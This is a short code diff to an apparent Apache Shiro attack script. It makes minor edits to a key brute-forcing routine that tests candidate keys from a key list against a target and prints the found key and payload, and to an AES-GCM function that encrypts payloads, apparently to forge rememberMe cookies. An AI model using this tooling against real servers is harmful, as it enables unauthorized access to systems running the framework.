@@ -57,7 +57,7 @@ def check_shiro():
             print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
             exit()
 
-def brute_key(url,type,data):
+def brute_key(url, type, data, key=None):
     res_length = check_shiro()
     try:
         with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
@@ -81,7 +81,7 @@ def brute_key(url,type,data):
 
             if res_length != rsp and r.status_code != 400:
                 print("[*] The correct key : {0}".format(key))
-                print("[*] The payload : " + payload)
+                print("[*] The payload : {0}".format(payload))
                 exit()
 
         else:
@@ -94,8 +94,8 @@ def brute_key(url,type,data):
 def GCMEncrypt(key,file_body):
     iv                = os.urandom(16)
     cipher            = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
-    ciphertext, tag   = cipher.encrypt_and_digest(file_body) 
-    ciphertext        = ciphertext + tag   
+    ciphertext, tag   = cipher.encrypt_and_digest(file_body)
+    ciphertext        = ciphertext + tag
     base64_ciphertext = base64.b64encode(iv + ciphertext)
     return base64_ciphertext
 
